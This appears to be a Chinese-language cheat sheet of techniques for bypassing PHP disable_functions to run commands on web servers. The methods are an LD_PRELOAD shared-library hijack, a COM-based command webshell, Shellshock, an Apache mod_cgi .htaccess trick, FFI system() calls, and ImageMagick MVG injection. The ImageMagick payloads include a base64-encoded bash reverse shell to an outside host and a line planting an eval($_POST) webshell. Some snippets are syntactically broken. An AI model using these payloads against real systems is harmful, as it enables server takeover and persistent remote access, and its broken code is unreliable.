# Bypass disable_function
## LD_PRELOAD
什么是LD_PRELOAD？

	LD_PRELOAD是Linux系统的一个环境变量，它的加载优先级最高，可以用来覆盖正常的函数库。我们可以通过LD_PRELOAD加载我们写的函数库，来覆盖系统中原有的一些函数达到执行命令的效果。AntSword中的disable_functions插件原理也是如此。
 首先我们需要一个动态加载链接.so,由.c编译利用linux指令
 `gcc -shared -fPIC test.c -o test.so`
 把test.c编译为test.so
 用它来执行system，删除环境变量LD_PRELOAD的值，劫持函数
`
__attribute__ ((__constructor__)) void angel (void){
  unsetenv("LD_PRELOAD");
 system(ls > /aim) //把输出结果重定向到目的文件
`
这里我们劫持的是c的构造函数（在加载时就执行代码）
然后使服务器执行LD_PRELOAD，常用服务器的mail功能
`mail("", "", "", "");`或`error_log(error,type,destination,headers)`
当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址即`error_log("",1,"","")`然后把.so加入到LD_PRELOAD环境变量
`
putenv("LD_PRELOAD=/.so")
`
即可
## com组件
### 环境要求：
1.php.ini中已经开启com.allow_dcom、extension=php_com_dotnet.dll
2.在php/ext/里面存在php_com_dotnet.dll这个文件
利用原理：
在Windows环境中PHP中的COM()函数可以创建系统组件对象来运行系统命令。
这里我们用WScript.shell或Shell.Application

```php
<?php

$command = $_GET['cmd'];

$wsh = **new** COM('WScript.shell'); // 生成一个COM对象
Shell.Application也能

$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令

$stdout = $exec->StdOut();

$stroutput = $stdout->ReadAll();

echo $stroutput;

?>
```

## 利用Bash破壳（CVE-2014-6271）漏洞
### 环境要求：

Linux中Bash 版本小于等于4.3，且存在破壳漏洞
可以执行“env x='() { :;}; echo vulnerable' bash -c "echo this is a test"”来测试是否存在破壳漏洞，如果存在会输出 vulnerable this is a test
对于存在shellshock漏洞的环境下，Bash对于环境变量只是检测到函数，并且从’{‘开始执行，但是并没有在’}'后停止，也就是说定义在函数体外shell命令也会执行，所以env x='() { :;}; echo vulnerable' 输出了vulnerable。
### 漏洞成因：
bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。
bash自定义函数，只需要函数名就能够调用该函数。

 

```bash
   funtion ShellShock {
     echo "Injection"
    } 
    ShellShock   #调用这个函数
```

这个时候的Bash的环境变量：

```bash
KEY = ShellShock
VALUE = () { echo Injection; }
```
 如果环境变量的值以字符"() {"开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效。

```bash
➜  ~ export ShellShock="() { echo Hello ShellShock; }"
➜  ~ ShellShock
bash:ShellShock: command not found
➜  ~ bash
bash-4.1$ ShellShock
Hello ShellShock
bash-4.1$ 
```
## Apache Mod CGI
### 漏洞原理

> 任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.
> 
> apache在配置cgi后可以用ScriptAlias指令指定一个目录,指定的目录下面便存放可执行的cgi程序.若是想要增加文件夹也可执行cgi程序,则可在apache主配置文件中做如下设置
> 
> <Directory 路径>
> 
> Options +ExecCGI
> 
> </Directory>
> 
> 例如
> 
> <Directory /var/www/html/>
> 
> Options +ExecCGI                      #这便是允许cgi程序执行
> 
> </Directory>
> 
> 当然,若是想临时允许一个目录可以执行cgi程序并且使得服务器将自定义的后缀解析为cgi程序,则可以在目的目录下使用htaccess文件进行配置,如下,
> 
> Options +ExecCGI    
> 
> AddHandler .ext
> 
> 比如.nb后缀.
> 
> Options +ExecCGI
> 
> AddHandler cgi-script .nb
> 
### 实现步骤
准备.htaccess文件
Options +ExecCGI
AddHandler cgi-script .xxx
执行文件 shell.xxx
里面写命令
**注意**要修改文件权限为0777
## FFI组件
php>7.4，开启了FFI扩展ffi.enable=true，我们可以通过FFI来调用C中的system进而达到执行命令的目的

```bash
<?php
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("whoami >/tmp/1");
echo file_get_contents("/tmp/1");
@unlink("/tmp/1");
?>
```
## ImageMagick

`
/etc/ImageMagick/delegates.xml
<delegate decode="https" command="&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;"/>
&quot; 是 " 的html实体编码 
`

解析https图片的时候，使用了curl命令将其下载，%o是curl输出的文件名，%M是远程的URL路径

command中 %M 直接拼接。漏洞产生，传入系统的system函数，payload只需使用反引号或闭合双引号，执行任意命令
构造.mvg格式的图片，不用改后缀，ImageMagick会根据其内容识别为mvg图片，图片内容（POC）如下

 

```bash
   无回显 可利用dnslog查看
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/1.jpg"|whoami")'
    pop graphic-context
     
    反弹shell
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.0/1.jpg"|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMS4xLjEvODg4OCAwPiYx== | base64 -d| bash ")'
    pop graphic-context
     
    写shell
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://example.com/1.jpg"|echo \'<?php eval($_POST[\'ant\']);?>\' > shell.php")'
    pop graphic-context
```




